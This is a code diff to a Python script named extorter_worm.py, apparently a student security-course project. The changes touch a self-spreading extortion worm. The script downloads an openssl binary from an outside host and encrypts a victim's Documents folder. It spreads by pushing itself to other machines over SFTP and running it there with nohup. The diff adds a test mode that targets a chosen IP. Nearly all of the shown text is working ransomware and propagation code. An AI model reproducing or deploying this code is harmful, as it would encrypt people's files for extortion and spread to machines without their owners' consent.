@@ -139,11 +139,19 @@ def encryptVictim():
 
 
 markSystem();
-if len(sys.argv) == 2:
+
+wormLocation = "/tmp/extorter_worm.py"
+
+if len(sys.argv) >= 2:
 	if sys.argv[1] == "-host":
-		print("Will mark and spread worm but won't encrypt Documents folder")
+		print("This is the host computer will not encrypt this Documents folder!")
+		wormLocation = "extorter_worm.py"
+	elif sys.argv[1] == "-t":
+		print("Testing spreading with this IP: %s" %(str(argv[2])))
+		wormLocation = "extorter_worm.py"
+		network = [argv[2]]
 else:
-	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
+	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
 	encryptVictim()
 
 
@@ -165,7 +173,7 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("extorter_worm.py", "/tmp/" + "extorter_worm.py")
+				sftpClient.put(wormLocation, "/tmp/" + "extorter_worm.py")
 				sshInfo[0].exec_command("chmod a+x /tmp/extorter_worm.py")
 				sshInfo[0].exec_command("nohup python /tmp/extorter_worm.py &")
 			except:
